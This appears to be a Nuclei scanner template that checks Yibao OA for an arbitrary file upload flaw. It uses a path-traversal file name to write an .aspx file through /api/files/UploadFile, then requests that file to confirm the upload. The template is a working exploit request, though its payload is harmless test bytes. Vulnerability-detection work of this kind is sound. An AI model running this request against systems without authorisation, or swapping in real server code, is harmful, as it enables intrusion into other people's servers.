id: yibao-uploadfile-upload

info:
  name: yibao-uploadfile-upload
  author: HB
  severity: critical
  description: 易宝OA UploadFile存在任意文件上传漏洞

variables:
  filename: "{{to_lower(rand_base(6))}}"

http:
  - raw:
    - |
      POST /api/files/UploadFile HTTP/1.1
      Host: {{Hostname}}
      Accept-Encoding: gzip
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 1926
      
      token=zxh&FileName=/../../manager/{{filename}}.aspx&pathType=1&fs=[116,101,115,116]
    
    - |
      GET /{{filename}}.aspx HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3
      Accept: */*

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body_2,"test")'